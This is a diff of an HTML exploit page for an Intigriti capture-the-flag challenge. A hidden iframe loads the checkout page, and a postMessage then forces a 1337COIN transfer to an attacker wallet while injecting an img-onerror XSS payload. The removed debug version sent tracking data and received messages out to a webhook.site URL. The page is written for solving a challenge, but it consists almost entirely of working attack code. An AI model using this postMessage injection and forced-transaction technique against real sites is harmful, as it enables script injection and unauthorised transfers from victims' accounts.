@@ -1,106 +1,41 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Debug Iframe</title>
-    <style>
-        body{font-family:monospace;background:#0a0a0a;color:#00ff00;padding:20px;}
-        iframe{width:600px;height:500px;border:2px solid #00ff00;}
-        #log{margin-top:20px;max-height:300px;overflow-y:scroll;}
-    </style>
-</head>
+<head><title>Exploit</title></head>
 <body>
-    <h1>DEBUG - VISIBLE IFRAME</h1>
-    <div id="log">Loading...</div>
-    <iframe id="checkout" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1"></iframe>
+<pre id=log>Loading...</pre>
+<iframe id=x src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style=display:none></iframe>
+<script>
+const WEBHOOK = 'https://webhook.site/29343f11-0f99-4e28-b761-c1fff1028f35';
+const WALLET = '16472226db03703a192aa383237035a69f';
+const log = document.getElementById('log');
 
-    <script>
-        const WEBHOOK = 'https://webhook.site/a0c5dc4c-1b40-463c-95b6-64ea3c45809c';
-        const YOUR_WALLET = '1cc4a7735c998cb4b4e390e97c349281d2';
+function msg(s) { log.textContent += '\n' + s; console.log(s); }
 
-        function log(msg) {
-            document.getElementById('log').innerHTML += '<br>' + msg;
-            console.log(msg);
-        }
+document.getElementById('x').onload = () => {
+    msg('[+] Iframe loaded');
 
-        function track(step, status, data = {}) {
-            new Image().src = `${WEBHOOK}?debug_${step}=${status}&ts=${Date.now()}&d=${encodeURIComponent(JSON.stringify(data))}`;
-        }
+    setTimeout(() => {
+        msg('[+] Sending postMessage...');
 
-        track('start', 'loaded', {});
-
-        const iframe = document.getElementById('checkout');
-
-        // Check iframe status periodically
-        let checks = 0;
-        const checkInterval = setInterval(() => {
-            checks++;
-            track('check', 'attempt', { count: checks });
-
-            try {
-                // Try to access iframe location (will fail due to cross-origin)
-                const loc = iframe.contentWindow.location.href;
-                track('iframe_url', 'success', { url: loc.substring(0, 50) });
-                log(`Check ${checks}: ${loc.substring(0, 60)}...`);
-            } catch(e) {
-                // Cross-origin error - but means iframe is still there
-                track('iframe_cross_origin', 'expected', { check: checks });
-                log(`Check ${checks}: Iframe is loaded (cross-origin)`);
+        document.getElementById('x').contentWindow.postMessage({
+            type: 'submitTransaction',
+            transaction: {
+                toAddress: WALLET,
+                currency: '1337COIN',
+                amount: 1,
+                nickname: '<img src=x onerror="alert(\'gigawatz\')">'
             }
+        }, '*');
 
-            if (checks >= 15) {
-                clearInterval(checkInterval);
-                track('checks_done', 'completed', { total: checks });
-            }
+        msg('[+] Payload sent!');
+        msg('[+] Wallet: ' + WALLET);
+
+        setTimeout(() => {
+            msg('[+] Redirecting to marketwatch...');
+            window.location.href = 'https://challenge-0126.intigriti.io/marketwatch.html';
         }, 2000);
-
-        iframe.onload = function() {
-            track('iframe_onload', 'fired', {});
-            log('Iframe onload fired!');
-
-            // Wait for checkout to initialize
-            setTimeout(() => {
-                log('Sending postMessage...');
-                track('sending', 'start', {});
-
-                const xssPayload = '<img src=x onerror="alert(\'gigawatz\')">';
-
-                // Send both transactions
-                iframe.contentWindow.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: YOUR_WALLET,
-                        currency: '1337COIN',
-                        amount: 1337
-                    }
-                }, '*');
-
-                track('tx1', 'sent', {});
-
-                iframe.contentWindow.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: xssPayload,
-                        currency: '1337COIN',
-                        amount: 0
-                    }
-                }, '*');
-
-                track('tx2', 'sent', {});
-                log('Both postMessages sent!');
-
-                // Listen for responses
-                window.addEventListener('message', (event) => {
-                    log(`MSG: ${JSON.stringify(event.data).substring(0, 100)}`);
-                    track('msg_received', 'info', event.data);
-                });
-
-            }, 10000); // 10 second wait
-        };
-
-        iframe.onerror = function() {
-            track('iframe_error', 'fired', {});
-            log('Iframe error!');
-        };
-    </script>
+    }, 2000);
+};
+</script>
 </body>
 </html>
